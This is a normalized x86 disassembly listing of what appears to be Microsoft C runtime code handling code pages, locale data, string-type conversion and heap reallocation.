call sub_41bc4a
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_41adb0
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_423628
push 0xc
push r--data
call sub_421220
call sub_41e872
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_4251cf
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4236c3
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_421265
retn
push 0x20
call sub_41f36c
cmp esi rw-data
je r-xdata
push esi
call sub_41a7eb
pop ecx
sub_4236cc
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_41b9dc
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_423748
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_4236cc
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_423434
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_41adb0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_423405
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_423498
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_41adb0
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_423405
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_423931
push 0x14
push r--data
call sub_421220
or [ ebp - 0x20 ] 0xffffffff
call sub_41e872
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_423628
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_4236cc
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_41c229
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_421265
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_423748
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_41c34a
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_41a7eb
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_41a7eb
pop ecx
push 0xd
call sub_4251cf
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_423a92
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_41a7eb
pop ecx
sub_423b1c
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_41b9dc
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_4287ce
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_423cbb
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_423bd4
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x1c ]
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x1c ] eax
jle r-xdata
xor eax eax
jmp r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_41ac09
leave
retn
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_41adb0
add esp 0xc
push edi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x1c ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_41b9bc
mov eax [ ebp - 0x8 ]
pop ecx
push [ ebp + 0x18 ]
push eax
push ebx
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_41ae2a
pop ecx
cmp eax ebx
je r-xdata
call sub_423af0
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_423cbb
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_41b9dc
push [ ebp + 0x24 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_423bd4
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_423cfb
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_41ae2a
pop ecx
pop ebp
retn
push edi
jmp r-xdata
push [ ebp + 0x8 ]
call sub_41a7eb
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_41eda1
pop ecx
call sub_41c34a
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
call sub_41c34a
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_41c308
pop ecx
mov [ esi ] eax
push esi
call sub_41eda1
pop ecx
test eax eax
je r-xdata
call sub_41c34a
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_41c308
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_423da8
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
movzx ebx [ eax + 0x42 ]
push esi
mov esi ecx
movzx ecx [ eax + 0x44 ]
mov [ ebp - 0x4 ] ecx
test esi esi
jne r-xdata
and [ ebp - 0x8 ] 0x0
push edi
mov [ ebp - 0xc ] eax
lea eax [ esi + 0x4 ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
mov edi eax
lea eax [ esi + 0x8 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0xc ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x10 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ esi + 0x14 ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x18 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
push esi
push 0x37
push ebx
or edi eax
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x20 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ esi + 0x24 ]
push eax
push 0x2b
push ebx
push 0x1
lea eax [ ebp - 0xc ]
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x28 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x2c ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x30 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ esi + 0x34 ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x1c ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x38 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x3c ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ esi + 0x40 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x44 ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x48 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x4c ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ esi + 0x50 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x54 ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x58 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x5c ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ esi + 0x60 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x64 ]
push eax
push 0x4f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x68 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x6c ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ esi + 0x70 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x74 ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x78 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x7c ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ esi + 0x80 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x84 ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x88 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x8c ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ esi + 0x90 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x94 ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x98 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x9c ]
push eax
push 0x29
push ebx
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ esi + 0xa0 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0xa4 ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0xa8 ]
push eax
push 0x1003
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x1
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0xb0 ]
push eax
push 0x1009
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
call sub_41e4e9
or edi eax
mov eax [ ebp - 0x4 ]
add esp 0x50
mov [ esi + 0xac ] eax
lea eax [ esi + 0xbc ]
push eax
push 0x31
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0xc0 ]
push eax
push 0x32
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0xc4 ]
push eax
push 0x33
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0xc8 ]
push eax
push 0x34
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ esi + 0xcc ]
push eax
push 0x35
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0xd0 ]
push eax
push 0x36
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0xb8 ]
push eax
push 0x37
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0xd8 ]
push eax
push 0x2a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ esi + 0xdc ]
push eax
push 0x2b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0xe0 ]
push eax
push 0x2c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0xe4 ]
push eax
push 0x2d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0xe8 ]
push eax
push 0x2e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ esi + 0xec ]
push eax
push 0x2f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0xd4 ]
push eax
push 0x30
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0xf0 ]
push eax
push 0x44
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0xf4 ]
push eax
push 0x45
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ esi + 0xf8 ]
push eax
push 0x46
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0xfc ]
push eax
push 0x47
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x100 ]
push eax
push 0x48
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x104 ]
push eax
push 0x49
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ esi + 0x108 ]
push eax
push 0x4a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x10c ]
push eax
push 0x4b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x110 ]
push eax
push 0x4c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x114 ]
push eax
push 0x4d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ esi + 0x118 ]
push eax
push 0x4e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x11c ]
push eax
push 0x4f
push ebx
push 0x2
lea eax [ ebp - 0xc ]
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x120 ]
push eax
push 0x38
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x124 ]
push eax
push 0x39
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ esi + 0x128 ]
push eax
push 0x3a
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x12c ]
push eax
push 0x3b
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x130 ]
push eax
push 0x3c
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x134 ]
push eax
push 0x3d
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ esi + 0x138 ]
push eax
push 0x3e
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x13c ]
push eax
push 0x3f
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x140 ]
push eax
push 0x40
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x144 ]
push eax
push 0x41
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ esi + 0x148 ]
push eax
push 0x42
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x14c ]
push eax
push 0x43
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x150 ]
push eax
push 0x28
push ebx
lea eax [ ebp - 0xc ]
push 0x2
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x154 ]
push eax
push 0x29
push ebx
push 0x2
pop ebx
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_41e4e9
add esp 0x50
or edi eax
lea eax [ esi + 0x158 ]
push eax
push 0x1f
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_41e4e9
or edi eax
lea eax [ esi + 0x15c ]
push eax
push 0x20
push [ ebp - 0x4 ]
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_41e4e9
add esi 0x160
push esi
push 0x1003
push [ ebp - 0x4 ]
or edi eax
lea eax [ ebp - 0xc ]
push ebx
push eax
call sub_41e4e9
add esp 0x3c
or eax edi
pop edi
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_4245a7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_41a7eb
push [ esi + 0x8 ]
call sub_41a7eb
push [ esi + 0xc ]
call sub_41a7eb
push [ esi + 0x10 ]
call sub_41a7eb
push [ esi + 0x14 ]
call sub_41a7eb
push [ esi + 0x18 ]
call sub_41a7eb
push [ esi ]
call sub_41a7eb
push [ esi + 0x20 ]
call sub_41a7eb
push [ esi + 0x24 ]
call sub_41a7eb
push [ esi + 0x28 ]
call sub_41a7eb
push [ esi + 0x2c ]
call sub_41a7eb
push [ esi + 0x30 ]
call sub_41a7eb
push [ esi + 0x34 ]
call sub_41a7eb
push [ esi + 0x1c ]
call sub_41a7eb
push [ esi + 0x38 ]
call sub_41a7eb
push [ esi + 0x3c ]
call sub_41a7eb
add esp 0x40
push [ esi + 0x40 ]
call sub_41a7eb
push [ esi + 0x44 ]
call sub_41a7eb
push [ esi + 0x48 ]
call sub_41a7eb
push [ esi + 0x4c ]
call sub_41a7eb
push [ esi + 0x50 ]
call sub_41a7eb
push [ esi + 0x54 ]
call sub_41a7eb
push [ esi + 0x58 ]
call sub_41a7eb
push [ esi + 0x5c ]
call sub_41a7eb
push [ esi + 0x60 ]
call sub_41a7eb
push [ esi + 0x64 ]
call sub_41a7eb
push [ esi + 0x68 ]
call sub_41a7eb
push [ esi + 0x6c ]
call sub_41a7eb
push [ esi + 0x70 ]
call sub_41a7eb
push [ esi + 0x74 ]
call sub_41a7eb
push [ esi + 0x78 ]
call sub_41a7eb
push [ esi + 0x7c ]
call sub_41a7eb
add esp 0x40
